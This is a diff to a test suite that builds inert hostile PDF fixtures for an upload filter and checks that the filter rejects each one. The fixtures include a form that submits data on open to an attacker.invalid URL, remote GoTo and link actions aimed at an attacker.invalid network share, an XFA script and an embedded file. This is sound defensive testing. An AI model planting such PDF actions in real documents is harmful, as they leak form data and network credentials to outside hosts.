@@ -108,6 +108,44 @@ def _minimal_pdf(page_count: int) -> bytes:
     return bytes(output)
 
 
+def _structured_pdf(
+    *, catalog: bytes = b"", page: bytes = b"", extra: tuple[bytes, ...] = ()
+) -> bytes:
+    """A valid one-page PDF with an xref table, so the structural policy
+    (not the malformed-file path) is what judges it. ``extra`` objects are
+    numbered from 4; every payload is inert text, never executable."""
+
+    objects: list[bytes] = [
+        b"<< /Type /Catalog /Pages 2 0 R " + catalog + b">>",
+        b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>",
+        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] " + page + b">>",
+        *extra,
+    ]
+    output = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
+    offsets = [0]
+    for index, body in enumerate(objects, start=1):
+        offsets.append(len(output))
+        output.extend(f"{index} 0 obj\n".encode("ascii"))
+        output.extend(body)
+        output.extend(b"\nendobj\n")
+    xref = len(output)
+    output.extend(f"xref\n0 {len(objects) + 1}\n".encode("ascii"))
+    output.extend(b"0000000000 65535 f \n")
+    for offset in offsets[1:]:
+        output.extend(f"{offset:010d} 00000 n \n".encode("ascii"))
+    output.extend(
+        f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode("ascii")
+    )
+    return bytes(output)
+
+
+def _stream(payload: bytes, dictionary: bytes = b"") -> bytes:
+    return (
+        b"<< /Length " + str(len(payload)).encode("ascii") + b" " + dictionary + b">>\nstream\n"
+        + payload + b"\nendstream"
+    )
+
+
 def _png(width: int, height: int) -> bytes:
     """Build a deterministic RGB PNG."""
 
@@ -198,6 +236,46 @@ _BUILDERS: dict[str, Callable[[], bytes]] = {
         b"/JS (app.launchURL) >> >>\nendobj\n%%EOF\n"
     ),
     "pdf-malformed-xref": lambda: b"%PDF-1.7\n1 0 obj << /Type /Catalog >>\nstartxref\nnope\n",
+    # Structured active content (2026-10-13): each refused by the shared
+    # policy in documents/pdf_policy.py, inside the worker.
+    "pdf-xfa-script": lambda: _structured_pdf(
+        catalog=b"/AcroForm << /Fields [] /XFA [(template) 4 0 R] >> ",
+        extra=(_stream(
+            b"<template><subform><script>/* inert fixture */</script></subform></template>"
+        ),),
+    ),
+    "pdf-remote-goto": lambda: _structured_pdf(
+        page=b"/AA << /O << /S /GoToR /F (\\\\\\\\attacker.invalid\\\\share\\\\x.pdf) /D [0 /Fit] >> >> ",
+    ),
+    "pdf-unc-link": lambda: _structured_pdf(
+        page=b"/Annots [4 0 R] ",
+        extra=(
+            b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
+            b"/A << /S /URI /URI (\\\\\\\\attacker.invalid\\\\share) >> >>",
+        ),
+    ),
+    "pdf-submit-form": lambda: _structured_pdf(
+        catalog=b"/OpenAction << /S /SubmitForm /F << /FS /URL /F (https://attacker.invalid/collect) >> >> ",
+    ),
+    "pdf-untyped-embedded-file": lambda: _structured_pdf(
+        page=b"/Annots [4 0 R] ",
+        extra=(
+            b"<< /Type /Annot /Subtype /FileAttachment /Rect [0 0 10 10] "
+            b"/FS << /Type /Filespec /F (notes.txt) /EF << /F 5 0 R >> >> >>",
+            _stream(b"inert attachment payload"),
+        ),
+    ),
+    "pdf-rendition": lambda: _structured_pdf(
+        catalog=b"/OpenAction << /S /Rendition /OP 0 /R << /Type /Rendition /S /MR >> >> ",
+    ),
+    "pdf-navigation-only": lambda: _structured_pdf(
+        catalog=b"/OpenAction << /S /GoTo /D [3 0 R /Fit] /Next << /S /Named /N /NextPage >> >> ",
+        page=b"/Annots [4 0 R] ",
+        extra=(
+            b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
+            b"/A << /S /URI /URI (https://example.com/terms) >> >>",
+        ),
+    ),
     "pdf-page-limit": lambda: _minimal_pdf(3),
     "image-pixel-limit": lambda: _png(2, 2),
     "csv-cell-limit": lambda: b"a,b\nc,d\n",
@@ -384,13 +462,75 @@ _CASES = (
         ("unsupported_document_format",),
     ),
     HostileCorpusCase(
+        "pdf-xfa-script",
+        "xfa-script.pdf",
+        "active-content",
+        "An XFA form, whose XML packets can carry scripts, is rejected.",
+        "sniff",
+        "reject",
+        ("unsafe_document",),
+    ),
+    HostileCorpusCase(
+        "pdf-remote-goto",
+        "remote-goto.pdf",
+        "external-reference",
+        "A remote GoTo to a network share (credential leak when opened) is rejected.",
+        "sniff",
+        "reject",
+        ("unsafe_document",),
+    ),
+    HostileCorpusCase(
+        "pdf-unc-link",
+        "unc-link.pdf",
+        "external-reference",
+        "A link to a network share instead of a web address is rejected.",
+        "sniff",
+        "reject",
+        ("unsafe_document",),
+    ),
+    HostileCorpusCase(
+        "pdf-submit-form",
+        "submit-form.pdf",
+        "active-content",
+        "A form that submits its data to a remote address on open is rejected.",
+        "sniff",
+        "reject",
+        ("unsafe_document",),
+    ),
+    HostileCorpusCase(
+        "pdf-untyped-embedded-file",
+        "untyped-embedded-file.pdf",
+        "active-content",
+        "An embedded file without the optional /Type marker is still rejected.",
+        "sniff",
+        "reject",
+        ("unsafe_document",),
+    ),
+    HostileCorpusCase(
+        "pdf-rendition",
+        "rendition.pdf",
+        "active-content",
+        "A rendition (media playback) action is rejected.",
+        "sniff",
+        "reject",
+        ("unsafe_document",),
+    ),
+    HostileCorpusCase(
+        "pdf-navigation-only",
+        "navigation-only.pdf",
+        "navigation-control",
+        "In-document navigation and an https link stay usable (negative control).",
+        "parse",
+        "fenced",
+    ),
+    HostileCorpusCase(
         "parser-crash",
         "parser-crash.txt",
         "parser-crash",
         "Certification suppresses the worker result to prove missing output fails closed.",
         "sandbox",
         "reject",
-        ("document_parser_failed",),
+        ("parser_result_missing",),
     ),
 )
 
